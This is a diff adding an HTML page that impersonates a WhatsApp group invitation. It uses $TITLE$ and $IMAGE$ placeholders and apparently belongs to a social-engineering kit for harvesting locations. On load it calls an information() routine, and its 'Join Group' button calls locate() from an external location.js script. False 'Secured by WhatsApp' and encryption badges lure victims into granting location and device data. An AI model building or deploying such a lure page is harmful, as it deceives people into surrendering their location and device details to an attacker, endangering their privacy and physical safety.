@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#00A884">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <title>WhatsApp Group Invite</title>
+    <script type="text/javascript">
+        if (window.location.protocol == "http:") {
+            var restOfUrl = window.location.href.substr(5);
+            window.location = "https:" + restOfUrl;
+        }
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #00A884 0%, #00897b 100%);
+            padding: 30px 20px;
+            text-align: center;
+            color: white;
+        }
+
+        .header-logo {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+
+        .header-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 10px 0;
+        }
+
+        .header-subtitle {
+            font-size: 13px;
+            opacity: 0.85;
+        }
+
+        .content {
+            padding: 40px 25px;
+            text-align: center;
+        }
+
+        .group-image {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 25px;
+            border-radius: 50%;
+            background-size: cover;
+            background-position: center;
+            border: 4px solid #E8E8E8;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .group-name {
+            font-size: 22px;
+            font-weight: 600;
+            color: #000;
+            margin: 20px 0 10px;
+            word-break: break-word;
+        }
+
+        .group-description {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .group-info {
+            background: #F0F0F0;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 25px 0;
+            font-size: 13px;
+            color: #555;
+            line-height: 1.6;
+        }
+
+        .join-button {
+            background: linear-gradient(135deg, #00A884 0%, #00897b 100%);
+            color: white;
+            border: none;
+            padding: 14px 50px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 25px;
+            cursor: pointer;
+            width: 100%;
+            margin: 25px 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 168, 132, 0.3);
+        }
+
+        .join-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 168, 132, 0.4);
+        }
+
+        .join-button:active {
+            transform: translateY(0);
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #999;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+
+        .download-link {
+            color: #00A884;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .download-link:hover {
+            text-decoration: underline;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #666;
+            margin-top: 15px;
+        }
+
+        .security-badge svg {
+            width: 16px;
+            height: 16px;
+            color: #00A884;
+        }
+
+        @media (max-width: 480px) {
+            .content {
+                padding: 30px 20px;
+            }
+
+            .group-name {
+                font-size: 18px;
+            }
+
+            .join-button {
+                padding: 12px 40px;
+                font-size: 15px;
+            }
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="js/location.js"></script>
+</head>
+<body onload="information();">
+    <div class="container">
+        <div class="header">
+            <div class="header-logo">WHATSAPP</div>
+            <div class="header-title">You're invited!</div>
+            <div class="header-subtitle">Join our community</div>
+        </div>
+
+        <div class="content">
+            <div class="group-image" style="background-image: url('$IMAGE$')"></div>
+
+            <div class="group-name">$TITLE$</div>
+            <div class="group-description">You've been invited to join this WhatsApp group</div>
+
+            <div class="group-info">
+                💬 Active community members<br>
+                🔒 End-to-end encrypted<br>
+                ⏰ Open 24/7
+            </div>
+
+            <button class="join-button" onclick="locate(function(){$('#change').html('Joined!'); alert('Thank you for joining our community!');}, function(){$('#change').html('Failed');});" id="change">
+                Join Group
+            </button>
+
+            <div class="footer-text">
+                Don't have WhatsApp? <a href="https://www.whatsapp.com/download" class="download-link">Download here</a>
+            </div>
+
+            <div class="security-badge">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                </svg>
+                Secured by WhatsApp
+            </div>
+        </div>
+    </div>
+</body>
+</html>
